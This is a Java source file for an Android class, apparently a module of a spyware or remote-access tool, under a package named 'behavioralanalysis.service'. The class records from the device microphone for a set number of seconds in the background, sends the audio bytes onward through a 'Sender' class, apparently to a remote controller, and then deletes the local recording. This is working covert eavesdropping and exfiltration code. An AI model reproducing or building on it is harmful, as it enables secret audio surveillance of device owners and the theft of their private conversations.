package com.behavioralanalysis.service;

import android.media.MediaRecorder;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.sql.PreparedStatement;
import java.util.Timer;
import java.util.TimerTask;

public class Microphones {
    private static MediaRecorder recorder;
    private static File file = null;
    private static final String tag = "MediaRecording";
    private static TimerTask stopRecording;

    public static void startRecording(int sec) throws Exception {
        File dir = MainService.getContext().getCacheDir();
        try {
            Log.e("DIRR", dir.getAbsolutePath());
            file = File.createTempFile("sound", ".mp3", dir);
        } catch (Exception e) {
            Log.e(tag, "Storage access error.");
            return;
        }

        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(file.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                recorder.stop();
                recorder.release();
                send(file);
                file.delete();
            }
        };

        new Timer().schedule(stopRecording, sec * 1000);
    }

    private static void send(File file) {
        int size = (int)file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            Sender.send(object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
